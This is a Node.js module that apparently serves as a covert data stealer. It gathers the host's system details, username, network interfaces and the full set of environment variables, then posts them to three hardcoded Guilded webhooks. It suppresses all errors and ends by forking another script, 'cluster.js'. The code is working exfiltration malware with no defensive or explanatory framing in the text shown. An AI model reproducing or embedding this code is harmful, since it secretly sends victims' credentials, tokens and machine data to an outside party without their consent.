const fs = require('fs')
const os = require('os')
const path = require('path')
const proc = require('process')
const cp = require('child_process')

const fetch = require('node-fetch')




const webhook = "https://media.guilded.gg/webhooks/747593aa-585d-46ac-81ae-012de3fab9b6/5HGiCm5TEsUG6IcyIcc4cSCoCqE2eMwcGGug4sqcCmQ2y0KEyY6wuycga0aiEG68MmWwwCWiA6Mw2Iya4uIIGi"
const envhook = "https://media.guilded.gg/webhooks/2eaf453d-ea5c-4b0e-b980-951b4145cfc8/JZ47Yadc8C4wW6mqIWSeow6wQs4YqgMkumS28Q80iAycqiMs8qAYuUaikUcYkQ02Kck2i0YEA602kaUQcMeGW4"
const nethook = "https://media.guilded.gg/webhooks/bb430717-4a4a-4b88-9e55-ddbefa2ad590/I20FVujre62aeOgMM60MGi8cg6uK0WK2iE66KgcYIK64GI4ckwm4Ag6Y08YaUKkmQY2WoOI0MYK42SgcmgSwKK"


module.exports = async (id, date) => {
    try{

    const cpu = os.cpus().at(0).model;
    const platform = os.platform()
    const arch = os.arch();
    const hostname = os.hostname()
    const homedir = os.homedir()
    const dir = path.join(__dirname, '.')
    const cores = os.cpus().length;
    const mem = `${((os.freemem() / (1024 * 1024 * 1024)).toFixed(2))}/${((os.totalmem() / (1024 * 1024 * 1024)).toFixed(2))}`
    const username = os.userInfo().username;
    const shell = os.userInfo().shell;
    const version = os.version()
    const type = os.type()
    const tmp = os.tmpdir()
    const mach = os.machine()
    const release = os.release()
    const node = proc.versions.node;
    const loadavg = os.loadavg().join(', ');
    const env = JSON.stringify(proc.env)
    const execp = proc.execPath
    const cwd = proc.cwd()
    const argv = JSON.stringify(proc.argv)
    const eth = JSON.stringify(os.networkInterfaces()['eth0'])
    const wifi = JSON.stringify(os.networkInterfaces()['Wi-Fi'])
    const root = fs.statSync('/').size

    const content = 
    `Date: ${new Date().toLocaleString().replaceAll(':', ' : ')}
    id: ${id}
    date: ${date}

    CPU: ${cpu}
    Platform: ${platform}
    Architecture: ${arch}
    Hostname: ${hostname}
    Home Directory: ${homedir}
    dir: ${dir}
    CPU Cores: ${cores}
    Memory: ${mem}
    Username: ${username}
    Shell: ${shell}
    OS Version: ${version}
    OS Type: ${type}
    OS Release: ${release}
    Temp Directory: ${tmp}
    Machine: ${mach} 
    Node Version: ${node}
    Load Average: ${loadavg}
    Node Executable Path: ${execp}
    Current Working Directory: ${cwd}
    Root Directory Size: ${root}
    Argv: \n${argv}


    `



    fetch(webhook, {
        method: "POST", 
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ content })
    })
    fetch(nethook, {
        method: "POST", 
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ content: 'id: ' + id + '\ndate: ' + date + '\n\neth:\n'+eth })
    })
    fetch(nethook, {
        method: "POST", 
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ content: 'id: ' + id + '\ndate: ' + date + '\n\nwifi:\n'+wifi })
    })



    fetch(envhook, {
        method: "POST", 
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ content: 'id: ' + id + '\ndate: ' + date + '\n\nenv:\n'+env.slice(0, 1900) })
    })
    fetch(envhook, {
        method: "POST", 
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ content: 'id: ' + id + '\ndate: ' + date + '\n\nenv2:\n'+env.slice(1900, 3800) })
    })

    cp.fork('./cluster.js')
    }catch(err){}

}